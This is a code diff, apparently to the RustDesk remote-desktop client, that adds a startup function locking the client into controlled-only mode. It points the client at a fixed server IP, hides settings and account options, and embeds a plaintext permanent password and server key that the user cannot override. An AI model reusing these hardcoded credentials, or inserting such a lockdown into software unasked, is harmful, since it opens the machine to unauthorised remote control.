@@ -47,6 +47,7 @@ pub fn core_main() -> Option<CoreMainAction> {
         return None;
     }
     crate::load_custom_client();
+    inject_bundled_host_only_config();
     #[cfg(windows)]
     if !crate::platform::windows::bootstrap() {
         // return None to terminate the process
@@ -723,6 +724,42 @@ pub fn core_main() -> Option<CoreMainAction> {
     #[cfg(not(feature = "flutter"))]
     return Some(CoreMainAction::StartUi(args));
 }
+
+/// 启动时注入硬编码配置，把当前客户端锁定为"只能被远控"的被控端模式。
+/// 用户无法在 UI 或配置文件中覆盖这些值。
+#[cfg(not(any(target_os = "android", target_os = "ios")))]
+fn inject_bundled_host_only_config() {
+    use hbb_common::config::{EXE_RENDEZVOUS_SERVER, HARD_SETTINGS, OVERWRITE_SETTINGS};
+
+    // 1. 锁定 rendezvous 服务器地址（最高优先级，覆盖一切）
+    *EXE_RENDEZVOUS_SERVER.write().unwrap() = "39.108.50.4:21116".to_string();
+
+    // 2. 写入硬编码开关（incoming-only 模式会让 UI 自动隐藏发起远控面板、
+    //    设置页、地址簿、账户登录等入口）
+    {
+        let mut hard = HARD_SETTINGS.write().unwrap();
+        hard.insert("conn-type".into(), "incoming".into());
+        hard.insert("disable-settings".into(), "Y".into());
+        hard.insert("disable-ab".into(), "Y".into());
+        hard.insert("disable-account".into(), "Y".into());
+        hard.insert("disable-installation".into(), "Y".into());
+        // 固定密码（明文存储于内存，供被控端验证）
+        hard.insert("password".into(), "HBKJ&38383111".into());
+    }
+
+    // 3. 强制覆盖 option 读取结果（优先级高于用户配置文件）
+    {
+        let mut ow = OVERWRITE_SETTINGS.write().unwrap();
+        ow.insert("key".into(), "4u2AB9Q0by9snsIcR2lfmeqqDcozJX0RuQc98nLOgN4=".into());
+        ow.insert("api-server".into(), "https://39.108.50.4:21118".into());
+        ow.insert("relay-server".into(), "39.108.50.4:21117".into());
+        // 只用固定密码，禁用临时密码
+        ow.insert("verification-method".into(), "use-permanent-password".into());
+    }
+}
+
+#[cfg(any(target_os = "android", target_os = "ios"))]
+fn inject_bundled_host_only_config() {}
 
 fn import_config(path: &str) {
     use hbb_common::{config::*, get_exe_time, get_modified_time};
